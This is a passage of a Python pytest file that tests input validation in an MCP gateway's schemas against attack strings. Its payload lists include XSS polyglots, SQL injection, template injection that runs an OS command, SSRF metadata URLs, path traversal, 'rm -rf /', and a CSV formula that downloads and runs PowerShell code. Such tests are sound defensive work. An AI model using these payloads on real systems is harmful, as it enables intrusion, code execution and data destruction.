        with pytest.raises(ValidationError) as exc_info:
            AdminToolCreate(name="test_tool", url="https://example.com", headers="not valid json")
        logger.debug(f"Validation error: {exc_info.value}")

    # --- Test Edge Cases and Combinations ---

    def test_null_byte_injection(self):
        """Test null byte injection attempts."""
        logger.debug("Testing null byte injection")

        null_byte_payloads = [
            "test\x00null",
            "test%00null",
            "test\u0000null",
            "test\\x00null",  # This one might be valid as it's just a string with backslash
        ]

        for payload in null_byte_payloads[:3]:  # Skip the last one as it might be valid
            logger.debug(f"Testing null byte payload: {repr(payload)}")

            # Tool name
            with pytest.raises(ValidationError) as exc_info:
                ToolCreate(name=payload, url=self.VALID_URL)
            logger.debug(f"Tool name validation error: {exc_info.value}")

            # Resource URI - some URIs might allow special chars
            if "\\" not in payload and "%" not in payload:
                with pytest.raises(ValidationError) as exc_info:
                    ResourceCreate(uri=payload, name="Resource", content="Content")
                logger.debug(f"Resource URI validation error: {exc_info.value}")

    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization vulnerabilities."""
        logger.debug("Testing Unicode normalization attacks")

        # These could bypass filters if not handled properly
        unicode_attacks = [
            "ｓｃｒｉｐｔ",  # Full-width Latin
            "scrіpt",  # Cyrillic 'і' instead of 'i'
            "ѕсrірt",  # Mixed Cyrillic
            "\u200b\u200bscript",  # Zero-width spaces
            "s\u200ccript",  # Zero-width non-joiner
        ]

        for payload in unicode_attacks:
            logger.debug(f"Testing Unicode attack: {repr(payload)}")
            # These should be caught by proper validation
            tool = ToolCreate(name="valid_name", url=self.VALID_URL, description=f"Test {payload}")
            # Should not contain the potentially dangerous content
            assert tool.description is not None  # It gets processed/escaped

    def test_polyglot_payloads(self):
        """Test polyglot payloads that work across multiple contexts."""
        logger.debug("Testing polyglot payloads")

        # Helper function
        def must_fail(payload: str, label: str = "Polyglot payload") -> None:
            """Ensure that polyglot payload raises ValidationError."""
            try:
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=payload)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {payload[:50]!r}... -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {payload[:50]!r}...")
                pytest.fail(f"{label} accepted although it should have been rejected")

        polyglot_payloads = [
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"--><svg/onload=alert(1)>",
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        ]

        for i, payload in enumerate(polyglot_payloads):
            logger.debug(f"Testing polyglot payload: {payload[:50]}...")
            must_fail(payload, f"Polyglot #{i + 1}")

    def test_timing_attack_prevention(self):
        """Test that validation doesn't reveal timing information."""
        logger.debug("Testing timing attack prevention")

        # Standard
        import time

        # Short valid input
        start = time.time()
        try:
            ToolCreate(name="short", url=self.VALID_URL)
        except:
            pass
        short_time = time.time() - start

        # Long valid input
        start = time.time()
        try:
            ToolCreate(name="a" * 50, url=self.VALID_URL)
        except:
            pass
        long_time = time.time() - start

        logger.debug(f"Short input time: {short_time:.4f}s, Long input time: {long_time:.4f}s")
        # Times should be similar (no early exit on length)
        # This is a basic check - proper timing attack tests need more samples
        assert abs(short_time - long_time) < 0.1  # 100ms tolerance

    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        logger.debug("Testing resource exhaustion prevention")

        # Helper function
        def must_fail(test_data, label: str = "Resource exhaustion") -> None:
            """Ensure that resource exhaustion attempt raises ValidationError."""
            try:
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=test_data)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected -> {err}")
            else:
                print(f"❌ {label} passed but should have failed")
                pytest.fail(f"{label} accepted although it should have been rejected")

        # Extremely deep JSON
        deep_json = {"a": None}
        current = deep_json
        for _ in range(100):
            current["a"] = {"a": None}
            current = current["a"]

        logger.debug("Testing extremely deep JSON")
        must_fail(deep_json, "Extremely deep JSON (100 levels)")

        # Extremely large array
        logger.debug("Testing extremely large array specification")
        schema = {"type": "array", "minItems": 999999999}
        try:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
            print(f"⚠️  Large array schema accepted (may cause runtime issues): minItems={schema['minItems']}")
        except ValidationError as e:
            print(f"✅ Large array schema rejected: {e}")

    def test_parser_differential_attacks(self):
        """Test for parser differential vulnerabilities."""
        logger.debug("Testing parser differential attacks")

        # Different parsers might interpret these differently
        differential_payloads = [
            '{"a": 1, "a": 2}',  # Duplicate keys
            '{"a": "\\u0000"}',  # Null character
            '{"a": "\\ud800"}',  # Invalid UTF-16 surrogate
            '{"a": 1e999999}',  # Huge number
            '{"a": -1e999999}',  # Huge negative number
        ]

        for payload in differential_payloads:
            logger.debug(f"Testing differential payload: {payload}")
            # Should either parse consistently or reject
            try:
                data = json.loads(payload)
                # If it parses, ensure we handle it safely
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=data)
            except (json.JSONDecodeError, ValidationError) as e:
                # Expected - either JSON parse fails or validation catches it
                logger.debug(f"Payload rejected: {e}")

    def test_combined_attack_vectors(self):
        """Test combinations of attack vectors."""
        logger.debug("Testing combined attack vectors")

        # XSS + SQLi
        combined_payload = "'; DROP TABLE users; --<script>alert('XSS')</script>"
        logger.debug(f"Testing XSS + SQLi: {combined_payload}")
        with pytest.raises(ValidationError) as exc_info:
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=combined_payload)
        logger.debug(f"Validation error: {exc_info.value}")

        # Path traversal + XSS
        combined_payload = "../../../etc/passwd<script>alert('XSS')</script>"
        logger.debug(f"Testing path traversal + XSS: {combined_payload}")
        with pytest.raises(ValidationError) as exc_info:
            ResourceCreate(uri=combined_payload, name="Resource", content="Content")
        logger.debug(f"Validation error: {exc_info.value}")

        # CRLF + XSS
        combined_payload = "value\r\n\r\n<script>alert('XSS')</script>"
        logger.debug(f"Testing CRLF + XSS: {combined_payload}")
        with pytest.raises(ValidationError) as exc_info:
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=combined_payload)
        logger.debug(f"Validation error: {exc_info.value}")

    def test_schema_specific_attacks(self):
        """Test attacks specific to certain schema types."""
        logger.debug("Testing schema-specific attacks")

        # Helper function for ResourceSubscription
        def must_fail_subscription(uri: str, label: str = "Invalid subscription") -> None:
            """Ensure that malicious subscription URI raises ValidationError."""
            # First-Party
            from mcpgateway.schemas import ResourceSubscription

            try:
                ResourceSubscription(uri=uri, subscriber_id="sub123")
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {uri!r} -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {uri!r}")
                pytest.fail(f"{label} accepted although invalid")

        # Tool invocation with malicious arguments
        logger.debug("Testing malicious tool invocation name")
        try:
            tool_inv = ToolInvocation(name="<script>alert('XSS')</script>", arguments={"param": "value"})
            print(f"⚠️  ToolInvocation with XSS name accepted: {tool_inv.name}")
        except ValidationError as e:
            print(f"✅ ToolInvocation with XSS name rejected: {e}")

        # Resource subscription with XSS
        logger.debug("Testing malicious resource subscription URI")
        must_fail_subscription("<script>alert('XSS')</script>", "XSS in subscription URI")

        # Prompt invocation with template injection
        # First-Party
        from mcpgateway.schemas import PromptInvocation

        logger.debug("Testing template injection in prompt invocation")
        try:
            prompt_inv = PromptInvocation(name="{{7*7}}", arguments={"var": "value"})
            print(f"⚠️  PromptInvocation with template injection accepted: {prompt_inv.name}")
        except ValidationError as e:
            print(f"✅ PromptInvocation with template injection rejected: {e}")

    def test_authentication_bypass_attempts(self):
        """Test authentication bypass attempts."""
        logger.debug("Testing authentication bypass attempts")

        # SQL injection in auth fields
        for payload in self.SQL_INJECTION_PAYLOADS[:3]:
            logger.debug(f"Testing SQL injection in auth: {payload}")
            # Auth fields might not be validated as strictly
            try:
                tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, auth_type="basic", auth_username=payload, auth_password=SecretStr("password"))
                # If it passes, auth was assembled
                assert tool.auth is not None
            except ValidationError as e:
                logger.debug(f"Auth validation error: {e}")

        # LDAP injection in auth
        for payload in self.LDAP_INJECTION_PAYLOADS[:3]:
            logger.debug(f"Testing LDAP injection in gateway auth: {payload}")
            try:
                gateway = GatewayCreate(name="gateway", url=self.VALID_URL, auth_type="basic", auth_username=payload, auth_password=SecretStr("password"))
                assert gateway.auth_value is not None
            except ValidationError as e:
                logger.debug(f"Gateway auth validation error: {e}")

    def test_server_side_template_injection(self):
        """Test SSTI vulnerabilities in templates."""
        logger.debug("Testing server-side template injection")

        # Helper function
        def must_fail(template: str, label: str = "SSTI payload") -> None:
            """Ensure that SSTI payload raises ValidationError."""
            try:
                PromptCreate(name="test_prompt", template=template)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected: {template!r} -> {err}")
            else:
                print(f"❌ {label} passed but should have failed: {template!r}")
                pytest.fail(f"{label} accepted although it should have been rejected")

        ssti_payloads = [
            "{{7*7}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${7*7}",
            "#{7*7}",
            "%{7*7}",
            "{{''.class.mro[2].subclasses()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]

        for i, payload in enumerate(ssti_payloads):
            logger.debug(f"Testing SSTI payload: {payload[:50]}...")
            must_fail(payload, f"SSTI #{i + 1} ({payload[:20]}...)")

    def test_regex_dos_prevention(self):
        """Test prevention of ReDoS attacks."""
        logger.debug("Testing ReDoS prevention")

        redos_patterns = [
            "(a+)+$",
            "([a-zA-Z]+)*",
            "(a|a)*",
            "(.*a){x}",
            "((a*)*)*b",
        ]

        for pattern in redos_patterns:
            logger.debug(f"Testing ReDoS pattern: {pattern}")
            # These patterns in input schema could cause ReDoS
            schema = {"type": "string", "pattern": pattern}
            # Should either reject or handle safely
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
            # Input schema might have defaults
            assert tool.input_schema is not None

    @pytest.mark.skip(reason="Currently not applicable, XML parsing not used")
    def test_billion_laughs_attack(self):
        """Test XML entity expansion attack prevention."""
        logger.debug("Testing billion laughs attack")

        # Helper function
        def must_fail(content: str, mime: str, label: str = "XML bomb") -> None:
            """Ensure that XML bomb content raises ValidationError."""
            try:
                ResourceCreate(uri="test.xml", name="XML Resource", content=content, mime_type=mime)
            except ValidationError as err:
                print(f"✅ {label} correctly rejected -> {err}")
            else:
                print(f"❌ {label} passed but should have failed")
                pytest.fail(f"{label} accepted although it contains dangerous XML")

        # This would be relevant if XML parsing is involved
        xml_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>"""

        # Should be caught as dangerous content
        logger.debug("Testing XML bomb in resource content")
        must_fail(xml_bomb, "application/xml", "Billion laughs XML bomb")

    def test_prototype_pollution_prevention(self):
        """Test prevention of prototype pollution attacks."""
        logger.debug("Testing prototype pollution prevention")

        pollution_payloads = [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__.isAdmin": True},
        ]

        for i, payload in enumerate(pollution_payloads):
            logger.debug(f"Testing prototype pollution payload {i + 1}")
            # Should handle these safely
            try:
                tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=payload)
                # Verify the dangerous keys are preserved but handled safely
                assert tool.headers == payload
            except ValidationError as e:
                # Some payloads might be rejected due to non-string values
                logger.debug(f"Payload rejected: {e}")


# Run specific attack category tests
class TestSpecificAttackVectors:
    """Focused tests for specific attack categories."""

    def test_ssrf_prevention(self):
        """Test Server-Side Request Forgery prevention."""
        logger.debug("Testing SSRF prevention")

        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://127.0.0.1:8080/admin",  # Localhost
            "http://[::1]:8080",  # IPv6 localhost
            "http://0.0.0.0:8080",  # All interfaces
            "http://192.168.1.1",  # Private network
            "http://10.0.0.1",  # Private network
            "http://172.16.0.1",  # Private network
            "file:///etc/passwd",  # File protocol
            "gopher://example.com",  # Gopher protocol
            "dict://example.com",  # Dict protocol
            "ftp://example.com",  # FTP protocol
            "sftp://example.com",  # SFTP protocol
        ]

        for url in ssrf_urls:
            logger.debug(f"Testing SSRF URL: {url}")
            # Some HTTP URLs might be valid depending on settings
            if url.startswith(("file:", "gopher:", "dict:", "ftp:", "sftp:")):
                with pytest.raises(ValidationError) as exc_info:
                    ToolCreate(name="test", url=url)
                logger.debug(f"Tool validation error: {exc_info.value}")

                with pytest.raises(ValidationError) as exc_info:
                    GatewayCreate(name="test", url=url)
                logger.debug(f"Gateway validation error: {exc_info.value}")
            else:
                # HTTP URLs to private IPs might be allowed
                try:
                    tool = ToolCreate(name="test", url=url)
                    logger.debug(f"URL allowed: {url}")
                except ValidationError as e:
                    logger.debug(f"URL rejected: {e}")

    def test_open_redirect_prevention(self):
        """Test open redirect vulnerability prevention."""
        logger.debug("Testing open redirect prevention")

        redirect_urls = [
            "//evil.com",
            "https://example.com@evil.com",
            "https://example.com%2f@evil.com",
            "https://example.com\\.evil.com",
            "https://example.com/.evil.com",
            "https://evil.com#https://example.com",
            "https://example.com.evil.com",
            "https://example.com%00.evil.com",
        ]

        for url in redirect_urls:
            logger.debug(f"Testing redirect URL: {url}")
            # Some of these might be valid URLs but suspicious
            try:
                tool = ToolCreate(name="test", url=url)
                logger.debug(f"URL allowed: {url}")
            except ValidationError as e:
                logger.debug(f"URL rejected: {e}")

    def test_csv_injection_prevention(self):
        """Test CSV injection prevention."""
        logger.debug("Testing CSV injection prevention")

        csv_injection_payloads = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(1+1)",
            "=cmd|'/c calc.exe'",
            "=2+5+cmd|'/c calc.exe'",
            "=2+5+cmd|'/c powershell IEX(wget 0r.pe/p)'",
            '=HYPERLINK("http://evil.com","Click me")',
        ]

        for payload in csv_injection_payloads:
            logger.debug(f"Testing CSV injection: {payload}")
            # These should be allowed but properly escaped when output to CSV
            resource = ResourceCreate(uri="test.csv", name="CSV Resource", content=payload)
            assert resource.content == payload

    def test_zip_bomb_prevention(self):
        """Test zip bomb and similar compression attack prevention."""
        logger.debug("Testing zip bomb prevention")

        # Create a highly compressible payload
        zip_bomb_content = "A" * 1000000  # 1MB of same character

        # Should handle large but valid content
        resource = ResourceCreate(uri="test.txt", name="Large Resource", content=zip_bomb_content)
        assert len(resource.content) == 1000000

        # But prevent extremely large content
        logger.debug("Testing content exceeding max length")
        with pytest.raises(ValidationError) as exc_info:
            ResourceCreate(uri="test.txt", name="Too Large Resource", content="A" * (SecurityValidator.MAX_CONTENT_LENGTH + 1))
        logger.debug(f"Validation error: {exc_info.value}")

    def test_cache_poisoning_prevention(self):
        """Test cache poisoning attack prevention."""
        logger.debug("Testing cache poisoning prevention")

        cache_poisoning_headers = {
            "X-Forwarded-Host": "evil.com",
            "X-Forwarded-Port": "443",
            "X-Forwarded-Proto": "https",
            "X-Original-URL": "http://evil.com",
            "X-Rewrite-URL": "/admin",
            "CF-Connecting-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
        }

        # Headers should be allowed but handled safely
        tool = ToolCreate(name="test", url="https://example.com", headers=cache_poisoning_headers)
        assert tool.headers == cache_poisoning_headers
        logger.debug("Cache poisoning headers allowed (should be handled safely by application)")

    def test_http_response_splitting_prevention(self):
        """Test HTTP response splitting prevention."""
        logger.debug("Testing HTTP response splitting prevention")

        response_splitting_payloads = [
            "value\r\nSet-Cookie: admin=true",
            "value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
            "value%0d%0aSet-Cookie:%20admin=true",
            "value%0d%0a%0d%0a<html><body><script>alert('XSS')</script></body></html>",
        ]

        for payload in response_splitting_payloads:
            logger.debug(f"Testing response splitting: {payload[:50]}...")
            # These contain CRLF which might be caught by XSS filters
            try:
                tool = ToolCreate(name="test", url="https://example.com", description=payload)
                # If allowed, it should be escaped
                assert tool.description is not None
            except ValidationError as e:
                logger.debug(f"Payload rejected: {e}")


# Additional test for missing coverage
class TestAdditionalValidation:
    """Additional validation tests for edge cases and missing coverage."""

    def test_validation_with_none_values(self):
        """Test validation with None values where allowed."""
        logger.debug("Testing validation with None values")

        # Test optional fields with None
        tool = ToolCreate(name="test_tool", url="https://example.com", description=None)
        assert tool.description is None

        resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=None)
        assert resource.mime_type is None

    def test_boundary_values(self):
        """Test validation at boundary values."""
        logger.debug("Testing boundary values")

        # Exactly at max length
        "a" * SecurityValidator.MAX_NAME_LENGTH
        tool = ToolCreate(name="a" * 50, url="https://example.com")  # Assuming tool names have shorter limit
        assert len(tool.name) == 50

        # Just over max length
        with pytest.raises(ValidationError):
            ToolCreate(name="a" * 256, url="https://example.com")

    def test_special_url_formats(self):
        """Test special but valid URL formats."""
        logger.debug("Testing special URL formats")

        special_urls = [
            "https://example.com:443",  # Default HTTPS port
            "http://example.com:80",  # Default HTTP port
            "https://user@example.com",  # User info without password
            "https://example.com/path;param",  # Path parameters
            "https://example.com/path?a=1&b=2",  # Multiple query params
        ]

        for url in special_urls:
            logger.debug(f"Testing special URL: {url}")
            try:
                tool = ToolCreate(name="test", url=url)
                logger.debug(f"URL accepted: {url}")
            except ValidationError as e:
                logger.debug(f"URL rejected: {e}")

    def test_content_encoding_edge_cases(self):
        """Test content with various encodings."""
        logger.debug("Testing content encoding edge cases")

        # UTF-8 with BOM
        utf8_bom_content = b"\xef\xbb\xbfUTF-8 content with BOM"
        resource = ResourceCreate(uri="test://uri", name="Resource", content=utf8_bom_content)
        assert resource.content == utf8_bom_content

        # Mixed valid Unicode
        mixed_unicode = "ASCII mixed with 中文 and عربي and emoji 🎉"
        resource = ResourceCreate(uri="test://uri", name="Resource", content=mixed_unicode)
        assert resource.content == mixed_unicode

    def test_complex_json_schemas(self):
        """Test more complex but valid JSON schemas."""
        logger.debug("Testing complex JSON schemas")

        complex_schemas = [
            {
                "type": "object",
                "properties": {
                    "name": {"type": "string", "minLength": 1, "maxLength": 100},
                    "age": {"type": "integer", "minimum": 0, "maximum": 150},
                    "tags": {"type": "array", "items": {"type": "string"}, "uniqueItems": True},
                },
                "required": ["name"],
                "additionalProperties": False,
            },
            {"oneOf": [{"type": "string"}, {"type": "number"}, {"type": "boolean"}]},
            {"type": "object", "patternProperties": {"^[a-z]+$": {"type": "string"}, "^[0-9]+$": {"type": "number"}}},
        ]

        for schema in complex_schemas:
            logger.debug(f"Testing complex schema with {len(json.dumps(schema))} chars")
            tool = ToolCreate(name="test", url="https://example.com", input_schema=schema)
            assert tool.input_schema is not None


# Additional test cases for comprehensive coverage
class TestErrorMessageValidation:
    """Test that error messages are informative and don't leak sensitive info."""

    @pytest.mark.skip(reason="Not applicable for current validation setup")
    def test_error_messages_are_safe(self):
        """Ensure error messages don't reflect user input directly."""
        logger.debug("Testing error message safety")

        dangerous_input = "<script>alert('XSS')</script>"
        try:
            ToolCreate(name=dangerous_input, url="https://example.com")
            print(f"❌ Dangerous input was accepted: {dangerous_input}")
            pytest.fail("Dangerous input should have been rejected")
        except ValidationError as e:
            error_str = str(e)
            # Check if error message contains the raw dangerous input
            if "<script>" in error_str:
                print(f"⚠️  Error message contains raw HTML tags: {error_str[:100]}...")
                print("   This could be a security issue if displayed without escaping")
            else:
                print(f"✅ Error message properly sanitized (no raw HTML tags)")

            # The test expects no raw input in error messages
            assert "<script>" not in error_str, "Error messages should not contain raw user input"

    def test_error_messages_are_informative(self):
        """Ensure error messages provide useful feedback."""
        logger.debug("Testing error message informativeness")

        try:
            ToolCreate(name="", url="https://example.com")
        except ValidationError as e:
            error_str = str(e)
            assert "empty" in error_str.lower() or "required" in error_str.lower()
            logger.debug(f"Informative error: {error_str}")


class TestMimeTypeEdgeCases:
    """Additional MIME type validation tests."""

    def test_mime_type_with_multiple_parameters(self):
        """Test MIME types with multiple parameters."""
        logger.debug("Testing MIME types with multiple parameters")

        mime_types = [
            "text/plain; charset=utf-8; boundary=something",
            "multipart/form-data; charset=utf-8; boundary=----WebKitFormBoundary",
            "application/json; charset=utf-8; version=1.0",
        ]

        for mime in mime_types:
            logger.debug(f"Testing complex MIME type: {mime}")
            try:
                # Strip parameters for validation
                base_mime = mime.split(";")[0].strip()
                resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=base_mime)
                assert resource.mime_type == base_mime
            except ValidationError as e:
                logger.debug(f"MIME type rejected: {e}")

    def test_vendor_specific_mime_types(self):
        """Test vendor-specific MIME types."""
        logger.debug("Testing vendor-specific MIME types")

        vendor_types = [
            "application/vnd.ms-excel",
            "application/vnd.api+json",
            "application/vnd.company.app+xml",
            "application/x-custom-type",
            "text/x-markdown",
        ]

        for mime in vendor_types:
            logger.debug(f"Testing vendor MIME type: {mime}")
            # Vendor types with x- prefix or + suffix should be allowed
            if mime.startswith(("application/x-", "text/x-")) or "+" in mime:
                resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)
                assert resource.mime_type == mime
            else:
                try:
                    resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)
                except ValidationError as e:
                    logger.debug(f"Non-standard vendor type rejected: {e}")


class TestInternationalization:
    """Test validation with international characters and scripts."""

    def test_international_names(self):
        """Test names with various international scripts."""
        logger.debug("Testing international names")

        # These should be rejected as tool names must be ASCII
        international_names = [
            "工具名称",  # Chinese
            "أداة",  # Arabic
            "outil",  # French (actually ASCII, should work)
            "ツール",  # Japanese
            "инструмент",  # Russian
            "εργαλείο",  # Greek
        ]

        for name in international_names:
            logger.debug(f"Testing international name: {name}")
            if name.isascii():
                # ASCII names should work
                tool = ToolCreate(name=name, url="https://example.com")
                assert tool.name == name
            else:
                # Non-ASCII should be rejected for tool names
                with pytest.raises(ValidationError) as exc_info:
                    ToolCreate(name=name, url="https://example.com")
                logger.debug(f"Non-ASCII name rejected: {exc_info.value}")

    def test_international_descriptions(self):
        """Test descriptions with international content."""
        logger.debug("Testing international descriptions")

        international_descriptions = [
            "Description with Chinese: 这是一个描述",
            "وصف باللغة العربية",
            "Description avec français: çà et là",
            "Beschreibung mit Umlauten: äöüß",
            "説明とえもじ: 🌍🌎🌏",
            "Mixed: Hello мир 世界 🌐",
        ]

        for desc in international_descriptions:
            logger.debug(f"Testing international description: {desc[:30]}...")
            tool = ToolCreate(name="test_tool", url="https://example.com", description=desc)
            # Should be escaped but allowed
            assert tool.description is not None


class TestJSONPathValidation:
    """Additional JSONPath validation tests."""

    def test_complex_jsonpath_expressions(self):
        """Test complex JSONPath expressions."""
        logger.debug("Testing complex JSONPath expressions")

        jsonpaths = [
            "$..book[?(@.price < 10)]",
            "$.store.book[*].author",
            "$..book[(@.length-1)]",
            "$..*",
            "$..book[?(@.isbn)]",
            "$.store..price",
            "$..book[?(@.price < $.expensive)]",
        ]

        for path in jsonpaths:
            logger.debug(f"Testing JSONPath: {path}")
            tool = ToolCreate(name="test_tool", url="https://example.com", jsonpath_filter=path)
            assert tool.jsonpath_filter == path

    def test_invalid_jsonpath_patterns(self):
        """Test potentially dangerous JSONPath patterns."""
        logger.debug("Testing dangerous JSONPath patterns")

        # JSONPath itself doesn't execute code, but test for injection attempts
        dangerous_paths = [
            "$[<script>alert('XSS')</script>]",
            "$['; DROP TABLE users; --]",
            "$[`rm -rf /`]",
        ]

        for path in dangerous_paths:
            logger.debug(f"Testing dangerous JSONPath: {path}")
            # JSONPath doesn't validate syntax strictly, so these might pass
            tool = ToolCreate(name="test_tool", url="https://example.com", jsonpath_filter=path)
            assert tool.jsonpath_filter == path


class TestAuthenticationValidation:
    """Comprehensive authentication validation tests."""

    def test_auth_with_special_characters(self):
        """Test authentication with special characters."""
        logger.debug("Testing auth with special characters")

        special_creds = [
            ("user@example.com", "p@ssw0rd!"),
            ("user", "pass:with:colons"),
            ("user", "pass;with;semicolons"),
            ("user", 'pass"with"quotes'),
            ("user", "pass'with'quotes"),
            ("user", "pass\\with\\backslashes"),
        ]

        for username, password in special_creds:
            logger.debug(f"Testing auth with user={username}, pass={password[:10]}...")
            tool = ToolCreate(name="test_tool", url="https://example.com", auth_type="basic", auth_username=username, auth_password=password)
            assert tool.auth.auth_type == "basic"
            assert tool.auth.auth_value is not None

    def test_bearer_token_formats(self):
        """Test various bearer token formats."""
        logger.debug("Testing bearer token formats")

        tokens = [
            "simple-token-123",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",  # JWT-like
            "ghp_1234567890abcdef",  # GitHub-like
            "sk-1234567890abcdef",  # API key format
            "very-long-token-" + "x" * 200,  # Long token
        ]

        for token in tokens:
            logger.debug(f"Testing bearer token: {token[:20]}...")
            tool = ToolCreate(name="test_tool", url="https://example.com", auth_type="bearer", auth_token=token)
            assert tool.auth.auth_type == "bearer"
            assert tool.auth.auth_value is not None

    def test_custom_header_auth(self):
        """Test custom header authentication."""
        logger.debug("Testing custom header authentication")

        custom_headers = [
            ("X-API-Key", "my-secret-key"),
            ("X-Auth-Token", "token123"),
            ("Authorization", "Custom scheme123"),
            ("X-Custom-Auth", "value-with-special-chars!@#"),
        ]

        for key, value in custom_headers:
            logger.debug(f"Testing custom header: {key}: {value[:20]}...")
            tool = ToolCreate(name="test_tool", url="https://example.com", auth_type="authheaders", auth_header_key=key, auth_header_value=value)
            assert tool.auth.auth_type == "authheaders"
            assert tool.auth.auth_value is not None


class TestPerformanceAndLimits:
    """Test performance-related limits and DOS prevention."""

    def test_regex_performance(self):
        """Test that regex validation doesn't hang on malicious input."""
        logger.debug("Testing regex performance")

        # Standard
        import time

        # Patterns that could cause catastrophic backtracking
        evil_patterns = [
            "a" * 100 + "!" * 100,
            "x" * 1000 + "y" * 1000,
            ("a" + "b") * 500,
        ]

        for pattern in evil_patterns:
            logger.debug(f"Testing potential ReDoS pattern of length {len(pattern)}")
            start = time.time()
            try:
                ToolCreate(name="test", url="https://example.com", description=pattern)
            except ValidationError:
                pass
            elapsed = time.time() - start
            logger.debug(f"Validation took {elapsed:.4f}s")
            # Should complete quickly (under 1 second)
            assert elapsed < 1.0

    def test_memory_limits(self):
        """Test that validation doesn't consume excessive memory."""
        logger.debug("Testing memory limits")

        # Standard
        import sys

        # Create large but valid payloads
        large_description = "Safe description. " * 100  # Repeated safe content

        initial_size = sys.getsizeof(large_description)
        logger.debug(f"Initial string size: {initial_size} bytes")

        tool = ToolCreate(name="test", url="https://example.com", description=large_description)

        # The processed description shouldn't be significantly larger
        processed_size = sys.getsizeof(tool.description)
        logger.debug(f"Processed string size: {processed_size} bytes")

        # Allow for some overhead but not exponential growth
        assert processed_size < initial_size * 2


class TestSchemaEvolution:
    """Test that schemas handle future evolution gracefully."""

    def test_unknown_fields_ignored(self):
        """Test that unknown fields are ignored per schema config."""
        logger.debug("Testing unknown field handling")

        data = {
            "name": "test_tool",
            "url": "https://example.com",
            "future_field": "future_value",
            "another_unknown": {"nested": "data"},
        }

        # Should not raise error for unknown fields
        tool = ToolCreate(**data)
        assert tool.name == "test_tool"
        assert not hasattr(tool, "future_field")

    def test_optional_field_defaults(self):
        """Test that optional fields have sensible defaults."""
        logger.debug("Testing optional field defaults")

        # Minimal required fields only
        tool = ToolCreate(name="test_tool", url="https://example.com")

        # Check defaults
        assert tool.description is None
        assert tool.integration_type == "REST"
        assert tool.request_type == "SSE"
        assert tool.headers is None or tool.headers == {}
        assert tool.input_schema is not None  # Has default
        assert tool.auth is None


class TestSecurityBestPractices:
    """Test security best practices beyond basic validation."""

    def test_no_sensitive_data_in_logs(self):
        """Ensure sensitive data isn't logged."""
        logger.debug("Testing sensitive data handling")

        # Standard
        import io
        import logging

        # Capture log output
        log_capture = io.StringIO()
        handler = logging.StreamHandler(log_capture)
        logger.addHandler(handler)

        try:
            # Create tool with sensitive auth
            tool = ToolCreate(name="test_tool", url="https://example.com", auth_type="basic", auth_username="admin", auth_password="super-secret-password")

            # Log the tool (this might happen in real code)
            logger.debug(f"Created tool: {tool}")

            # Check log output
            log_contents = log_capture.getvalue()
            assert "super-secret-password" not in log_contents
            assert "admin" not in log_contents or "auth" not in log_contents

        finally:
            logger.removeHandler(handler)

    def test_constant_time_operations(self):
        """Test that validation doesn't leak timing information."""
        logger.debug("Testing constant-time validation")

        # Standard
        import statistics
        import time

        valid_times = []
        invalid_times = []

        # Actual measurement
        for _ in range(100):
            start = time.time()
            try:
                ToolCreate(name="valid_name", url="https://example.com")
            except:
                pass
            valid_times.append(time.perf_counter() - start)

            start = time.perf_counter()
            try:
                ToolCreate(name="<script>alert('XSS')</script>", url="https://example.com")
            except:
                pass
            invalid_times.append(time.perf_counter() - start)

        valid_median = statistics.median(valid_times)
        invalid_median = statistics.median(invalid_times)

        logger.debug(f"Valid median: {valid_median:.9f}s")
        logger.debug(f"Invalid median: {invalid_median:.9f}s")

        ratio = max(valid_median, invalid_median) / min(valid_median, invalid_median)
        assert ratio < 1.5, f"Timing difference too large: {ratio:.2f}x"


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short", "-s"])  # -s to see print statements